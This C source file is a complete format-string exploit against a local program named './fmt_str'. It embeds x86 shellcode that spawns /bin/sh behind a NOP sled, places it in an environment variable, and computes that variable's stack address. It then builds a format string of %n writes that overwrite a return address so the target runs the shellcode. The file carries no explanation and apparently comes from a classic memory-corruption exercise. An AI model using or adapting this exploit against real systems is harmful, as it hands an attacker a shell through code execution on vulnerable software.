#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

char shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 

int main(int argc, char *argv[])
{
    if(argc<2){
		printf("please input offset\n");
		exit(-1);
	}
    char buf[1024];
    char *p[] = {"./fmt_str", buf, NULL};
    char *env[] = {"HOME=/root", shellcode, NULL};
    unsigned long shAddr = 0xc0000000 - strlen(shellcode) - strlen("./fmt_str") - sizeof(void*) + 8;
    printf("shAddr:%x\n",shAddr);
    int a[4];
    int i;
    for(i=0; i<4; i++)
    {
        a[i] = (shAddr >> 8 * i) & 0xff;
    }
    printf("a:%x %x %x %x\n",a[0],a[1],a[2],a[3]);
    for(i=3; i>0; i--)
    {
        a[i] -= a[i-1];
        if(a[i] < 4) a[i] += 0x100;
    }
    a[0] -= 16;
    if(a[0] < 4) a[0] += 0x100;
    printf("a:%d %d %d %d\n",a[0],a[1],a[2],a[3]);

    unsigned long ret = (unsigned long)buf + atoi(argv[1]);
    printf("buf+offset:%x\n", ret);
    ret += 1036;
    for(i=0; i<4; i++)
    {
        *(int*)(buf + i * 4) = ret + i;
    }
    sprintf(buf + 16, "%%3$%dx%%4$n%%3$%dx%%5$n%%3$%dx%%6$n%%3$%dx%%7$n", a[0], a[1], a[2], a[3]);
	printf("buf:%s\n", buf);
    execve(p[0], p, env);
    return 0;
}
